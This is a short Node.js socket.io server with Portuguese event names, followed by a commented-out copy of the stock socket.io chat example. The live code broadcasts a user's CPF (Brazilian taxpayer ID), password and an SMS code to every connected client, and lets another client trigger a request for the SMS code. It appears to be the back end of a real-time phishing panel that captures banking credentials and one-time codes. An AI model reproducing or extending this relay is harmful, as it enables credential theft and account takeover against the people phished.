const express = require("express");
const { createServer } = require("http");
const { Server } = require("socket.io");

const app = express();
const httpServer = createServer(app);
const io = new Server(httpServer);
var path = require('path');
const { on } = require("events");
app.use(express.static(path.join(__dirname, 'public')));



app.get('/', (req, res)=>{
    res.sendFile(__dirname+'/index.html')
})  

io.on("connection", (socket) => {
  console.log('Usuario conectado: '+ socket.id)
  io.emit("usuarionovo", socket.id)
});

io.on("connection", (socket) =>{
  socket.on("pedirsms", () => {
    io.emit("pedirsms", "pedirsms")
  })
} );

io.on("connection", (socket) =>{
  socket.on("final", data => {
    io.emit("final", data)
  })
} );



io.on("connection", (socket) =>{
  socket.on("enviarcpf", valor => {
    io.emit("enviarcpf", valor)
  })
} );

io.on("connection", (socket) =>{
  socket.on("enviarcodigo", valor => {
    io.emit("enviarcodigo", valor)
  })
} );

io.on("connection", (socket) =>{
  socket.on("enviarsenha", valor => {
    io.emit("enviarsenha", valor)
  })
} );




io.on("connection", (socket) =>{
  socket.on("senhavalor", valor => {
    io.emit("senhavalor", valor)
  })
} );






httpServer.listen(3000, () => console.log("Servidor rodando na porta 3000"));
/*
// Setup basic express server
var express = require('express');
var app = express();
var path = require('path');
var server = require('http').createServer(app);
var io = require('../..')(server);
var port = process.env.PORT || 3000;

server.listen(port, () => {
  console.log('Server listening at port %d', port);
});

// Routing
app.use(express.static(path.join(__dirname, 'public')));

// Chatroom
var numUsers = 0;

io.on('connection', (socket) => {
  var addedUser = false;

  // when the client emits 'new message', this listens and executes
  socket.on('new message', (data) => {
    // we tell the client to execute 'new message'
    socket.broadcast.emit('new message', {
      username: socket.username,
      message: data
    });
  });

  // when the client emits 'add user', this listens and executes
  socket.on('add user', (username) => {
    if (addedUser) return;

    // we store the username in the socket session for this client
    socket.username = username;
    ++numUsers;
    addedUser = true;
    socket.emit('login', {
      numUsers: numUsers
    });
    // echo globally (all clients) that a person has connected
    socket.broadcast.emit('user joined', {
      username: socket.username,
      numUsers: numUsers
    });
  });

  // when the client emits 'typing', we broadcast it to others
  socket.on('typing', () => {
    socket.broadcast.emit('typing', {
      username: socket.username
    });
  });

  // when the client emits 'stop typing', we broadcast it to others
  socket.on('stop typing', () => {
    socket.broadcast.emit('stop typing', {
      username: socket.username
    });
  });

  // when the user disconnects.. perform this
  socket.on('disconnect', () => {
    if (addedUser) {
      --numUsers;

      // echo globally that this client has left
      socket.broadcast.emit('user left', {
        username: socket.username,
        numUsers: numUsers
      });
    }
  });
});*/